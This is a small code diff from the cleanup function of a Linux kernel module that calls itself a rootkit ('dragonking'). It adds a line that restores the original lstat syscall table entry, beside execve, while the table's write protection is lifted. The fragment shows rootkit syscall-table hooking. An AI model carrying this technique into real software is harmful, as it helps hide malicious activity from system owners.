@@ -50,6 +50,7 @@ static void __exit dragonking_cleanup(void)
 {
 	    set_addr_rw((unsigned long) sys_call_table);
 	    sys_call_table[__NR_execve] = (unsigned long*)&orig_execve;
+	    sys_call_table[__NR_lstat] = (unsigned long*)&orig_lstat;
 	    set_addr_ro((unsigned long) sys_call_table);
 	    printk(KERN_INFO "Rootkit removed.\n");
 }
